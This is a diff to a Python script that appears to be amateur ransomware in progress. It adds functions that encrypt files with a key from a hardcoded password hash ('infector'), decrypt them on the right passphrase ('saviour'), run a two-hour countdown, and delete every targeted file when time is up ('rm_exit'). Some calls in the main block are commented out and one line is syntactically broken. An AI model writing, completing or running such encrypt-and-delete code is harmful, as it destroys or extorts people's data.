@@ -4,8 +4,10 @@
 
 import os
 import sys
+import time
 import base64
 import logging
+import threading
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
@@ -129,20 +131,69 @@ def get_key(password, hashed=False):
     return key
 
 
-def infect():
-    pass_hash = b"\x95/c\xc67\x1c6n\xe1\xf6\xe2\xf6\xb2\xff\xb2E\xad\x96\xb4\x86\x08\xfc\xa7\x84\xfeQ\x8f\x07EHxv"
-    key = get_key(pass_hash, hashed=True)
-    files = get_files()
+def infector(files, key):
     enc_files = []
     for f in files:
         ff = encrypt(f, key)
         enc_files.append(ff)
-    password = input("Enter the phrase > ")
-    key = get_key(password)
+
+    return enc_files
+
+
+def saviour(files, key):
     dec_files = []
     for f in files:
         ff = decrypt(f, key)
         dec_files.append(ff)
 
+    return dec_files
 
 
+def timer(t=7200):
+    while t:
+        mins, secs = divmod(t, 60)
+        hours, mins = divmod(mins, 60)
+        timer = '{:02d}:{:02d}:{:02d}'.format(hours, mins, secs)
+        print(timer, end="\r")
+        time.sleep(1)
+        t -= 1
+
+def rm_exit():
+    files = get_files()
+    for f in files:
+        os.remove(f)
+    print("\nTimes up! All files have been deleted.")
+
+if __name__ == "__main__":
+    pass_hash = b"\x95/c\xc67\x1c6n\xe1\xf6\xe2\xf6\xb2\xff\xb2E\xad\x96\xb4\x86\x08\xfc\xa7\x84\xfeQ\x8f\x07EHxv"
+    the_key = get_key(pass_hash, hashed=True)
+    # files = get_files()
+    # files = infector(files, pass_hash)
+    # password = input("Enter the phrase > ")
+    # files = saviour(files, password)
+    # key = get_key(password)
+    # print(the_key)
+    # print(key)
+
+    t = 120
+    t_prime = t
+    # while t:
+        # mins, secs = divmod(t, 60)
+        # hours, mins = divmod(mins, 60)
+        # timer = '{:02d}:{:02d}:{:02d}'.format(hours, mins, secs)
+        # print(timer, end="\r")
+        # time.sleep(1)
+        # t -= 1
+        # if t = t_prime - 
+
+    
+
+    my_thread = threading.Thread(target=timer)
+    my_thread.start()
+
+    # t = threading.Timer(5, rm_exit)
+    # t.start()
+    password = input("Enter the Password: > ")
+
+
+    # t.cancel()
